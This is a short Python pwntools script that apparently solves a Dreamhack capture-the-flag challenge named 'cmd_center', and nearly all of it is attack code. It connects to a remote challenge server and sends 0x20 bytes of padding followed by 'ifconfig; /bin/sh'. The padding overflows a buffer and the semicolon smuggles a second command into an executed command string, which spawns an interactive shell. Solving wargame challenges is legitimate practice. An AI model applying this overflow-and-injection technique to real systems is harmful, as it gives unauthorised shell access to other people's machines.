from pwn import *

# p = process("./cmd_center")
# nc host3.dreamhack.games 20142
p = remote("host3.dreamhack.games", 20142)


pay = b''
pay += b'a' * 0x20
pay += b'ifconfig; /bin/sh'

p.sendafter("e: ", pay)


p.interactive()